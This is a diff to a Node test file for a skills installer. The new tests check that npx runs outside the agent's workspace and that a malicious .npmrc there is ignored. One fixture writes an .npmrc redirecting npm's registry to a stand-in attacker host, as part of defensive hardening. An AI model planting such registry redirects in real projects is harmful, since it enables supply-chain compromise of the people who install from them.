@@ -58,7 +58,7 @@ test('searchSkills uses the API and falls back to the CLI when the API fails', a
   assert.equal(viaCli[0]?.ref, 'x/y@z')
 })
 
-test('installSkill runs the skills CLI in the workspace and reports the SKILL.md path', async (t) => {
+test('installSkill runs the skills CLI outside the workspace, then moves the skill in', async (t) => {
   const { mkdtempSync, mkdirSync, writeFileSync, rmSync } = await import('node:fs')
   const { join } = await import('node:path')
   const { tmpdir } = await import('node:os')
@@ -74,8 +74,13 @@ test('installSkill runs the skills CLI in the workspace and reports the SKILL.md
   }
   const result = await installSkill('vercel-labs/agent-browser@agent-browser', dir, { runner })
   assert.equal(result.skill, 'agent-browser')
-  assert.ok(result.path.endsWith('/.claude/skills/agent-browser/SKILL.md'))
-  assert.equal(calls[0]?.cwd, dir)
+  assert.equal(result.path, join(dir, '.claude', 'skills', 'agent-browser', 'SKILL.md'))
+  const { existsSync } = await import('node:fs')
+  assert.ok(existsSync(result.path), 'the skill lands in the workspace')
+  const cwd = calls[0]!.cwd
+  assert.notEqual(cwd, dir, 'npx must not run in the workspace: npm would read a bot-written .npmrc there')
+  assert.ok(!cwd.startsWith(`${dir}/`), 'nor anywhere below it')
+  assert.equal(existsSync(cwd), false, 'the staging directory is removed afterwards')
   assert.ok(calls[0]?.args.includes('vercel-labs/agent-browser@agent-browser'))
 
   const failing = async () => ({ code: 1, stdout: '', stderr: 'boom' })
@@ -99,4 +104,26 @@ test('installSkill refuses to report success when the CLI exits 0 without writin
     installSkill('vercel-labs/agent-browser@agent-browser', dir, { runner: silent }),
     /skills add exited 0 but wrote no new skill under \.claude\/skills — is "vercel-labs\/agent-browser@agent-browser" already installed\?/,
   )
+})
+
+test('a bot-written .npmrc or package.json in the workspace never reaches the installer', async (t) => {
+  const { mkdtempSync, mkdirSync, writeFileSync, rmSync } = await import('node:fs')
+  const { join, relative, isAbsolute } = await import('node:path')
+  const { tmpdir } = await import('node:os')
+  const dir = mkdtempSync(join(tmpdir(), 'opendots-ws-'))
+  t.after(() => rmSync(dir, { recursive: true, force: true }))
+  writeFileSync(join(dir, '.npmrc'), 'registry=http://attacker.example/\n')
+  writeFileSync(join(dir, 'package.json'), '{"name":"bait"}')
+
+  let cwd = ''
+  const runner = async (_cmd: string, _args: string[], opts: { cwd: string }) => {
+    cwd = opts.cwd
+    mkdirSync(join(opts.cwd, '.claude', 'skills', 's'), { recursive: true })
+    writeFileSync(join(opts.cwd, '.claude', 'skills', 's', 'SKILL.md'), '# s')
+    return { code: 0, stdout: '', stderr: '' }
+  }
+  await installSkill('o/r@s', dir, { runner })
+  // npm looks for a project .npmrc by walking up from its cwd; the workspace must not be on that path.
+  const rel = relative(dir, cwd)
+  assert.ok(rel.startsWith('..') || isAbsolute(rel), `installer cwd ${cwd} must not be inside the workspace`)
 })
